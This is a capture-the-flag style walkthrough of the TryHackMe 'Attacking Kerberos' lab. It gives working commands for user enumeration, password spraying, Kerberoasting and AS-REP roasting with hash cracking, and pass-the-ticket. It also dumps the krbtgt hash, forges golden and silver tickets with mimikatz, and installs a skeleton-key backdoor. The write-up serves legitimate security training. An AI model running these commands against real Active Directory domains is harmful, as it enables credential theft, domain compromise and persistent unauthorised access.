# Attacking Kerberos

**Room Link:** [https://tryhackme.com/room/attackingkerberos](https://tryhackme.com/room/attackingkerberos)



## Presteps for Lab

### Kerbrute Installation &#x20;

&#x20;Download a precompiled binary for your OS - [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute && chmod +x kerbrute 
```

### Impacket Installation &#x20;

```
wget https://github.com/fortra/impacket/archive/refs/tags/impacket_0_9_19.tar.gz
tar xvf impacket_0_9_19.tar.gz 
cd /root/impacket-impacket_0_9_19
pip install .
```

### Download wordlists

```
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt
```



### Add hostname to host file

```
echo $VICTIM CONTROLLER.local  >> /etc/hosts
cat /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (2) (8).png" alt=""><figcaption></figcaption></figure>

## Enumeration w/ Kerbrute

This will brute force user accounts from a domain controller using a supplied wordlist

```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Harvesting & Brute-Forcing Tickets w/ Rubeus

Login with provided credentials

**Kali**

```
ssh Administrator@$VICTIM
Password: P@$$W0rd
```

Harvest tickets with Rubeus

**Victim**

```
cd Downloads
Rubeus.exe harvest /interval:30
```

<figure><img src="../../.gitbook/assets/image (3) (9).png" alt=""><figcaption></figcaption></figure>

This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

**Victim**

```
echo $VICTIM CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
cd Downloads
Rubeus.exe brute /password:Password1 /noticket
```

<figure><img src="../../.gitbook/assets/image (11) (6).png" alt=""><figcaption></figcaption></figure>

## Kerberoasting w/ Rubeus & Impacket

### Kerberoasting #1 - Rubeus&#x20;

This will dump the Kerberos hash of any kerberoastable users.

**Victim**

```
cd Downloads
Rubeus.exe kerberoast
```

<figure><img src="../../.gitbook/assets/image (12) (8).png" alt=""><figcaption></figcaption></figure>

Copy the hashes from the command prompt onto the attacker machine and put it into a .txt file so we can crack it with hashcat. Below command removes all the tabs and formats it properly for hashcat. If you don't format it properly than hashcat will error out.

**Kali**

```
cat hashes.txt | sed 's/[[:space:]]//g' |tr -d '\n' | sed 's/$krb5tgs$23$*/\n&/g'  > hash.txt
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

Hashcat found the passwords for both of the hashes.

```
hashcat -m 13100 -a 0 hash.txt Pass.txt --show
```

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

### Kerberoasting #2  - Impacket

```
sudo python3.9 /root/test/impacket/examples/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.226.108 -request > hashes.txt
```

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

Hashes were found for the same two accounts when doing this with Rubeus.

```
hashcat -m 13100 -a 0 hashes.txt Pass.txt
hashcat -m 13100 -a 0 hashes.txt Pass.txt --show
```

<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

## AS-REP Roasting w/ Rubeus

**Victim**

```
cd Downloads
Rubeus.exe asreproast
```

<figure><img src="../../.gitbook/assets/image (2) (1) (4).png" alt=""><figcaption></figcaption></figure>

**Kali**

Transfer the hash from the target machine over to kali and put the hash into a txt file. Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User... .The below command does the replace and clean up the output so hashcat can recognize the hashes.

```
cat hashes.txt | sed 's/[[:space:]]//g' |tr -d '\n'| sed 's/$krb5asrep/\n&/g' | sed  's/$krb5asrep/$krb5asrep$23/g'  > hash.txt
hashcat -m 18200 hash.txt Pass.txt
```

Both passwords cracked.

```
hashcat -m 18200 hash.txt Pass.txt --show
```

<figure><img src="../../.gitbook/assets/image (4) (8).png" alt=""><figcaption></figcaption></figure>

## Pass the Ticket w/ mimikatz

### Prepare Mimikatz & Dump Tickets

**Victim**

```
cd Downloads
mimikatz.exe
```

**Victim - Mimikatz**

```
privilege::debug
sekurlsa::tickets /export
```

<figure><img src="../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6) (7).png" alt=""><figcaption></figcaption></figure>

### Pass the Ticket w/ Mimikatz

Run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket

**Victim - Mimikatz**

```
kerberos::ptt [0;2b4efc]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
```

<figure><img src="../../.gitbook/assets/image (3) (10).png" alt=""><figcaption></figcaption></figure>

Here were just verifying that we successfully impersonated the ticket by listing our cached ticket.

**Victim**

```
klist
```

<figure><img src="../../.gitbook/assets/image (7) (4).png" alt=""><figcaption></figcaption></figure>

You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.

**Victim**

```
dir \\$VICTIM\admin$
```

<figure><img src="../../.gitbook/assets/image (1) (11) (1).png" alt=""><figcaption></figcaption></figure>

## Golden/Silver Ticket Attacks w/ mimikatz

**Victim**

```
cd downloads && mimikatz.exe
```

This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

**Victim - Mimikatz**

```
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

<figure><img src="../../.gitbook/assets/image (8) (4).png" alt=""><figcaption></figcaption></figure>

### Create a Golden/Silver Ticket

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

#### Golden Ticket

This is the command for creating a golden ticket.

**Victim - Mimikatz**

```
Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860  /krbtgt:72cd714611b64cd4d5550cd2759db3f6 
```

#### **Silver Ticket**

This is the command for creating a golden ticket as well but to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into **sid**, and change the id to 1103. &#x20;

**Victim - Mimikatz**

```
Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860  /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:1103
```

### Use the Golden/Silver Ticket to access other machines

```
misc::cmd
```



NTLM hash of Administrator

```
lsadump::lsa /inject /name:Administrator 
```

<figure><img src="../../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>

NTLM hash of SQLService

```
lsadump::lsa /inject /name:SQLService 
```

<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

## Kerberos Backdoors w/ mimikatz

**Victim**&#x20;

```
cd Downloads && mimikatz.exe
```

**Victim - Mimikatz**

```
privilege::debug
misc::skeleton
```

<figure><img src="../../.gitbook/assets/image (9) (5).png" alt=""><figcaption></figcaption></figure>



**Victim**
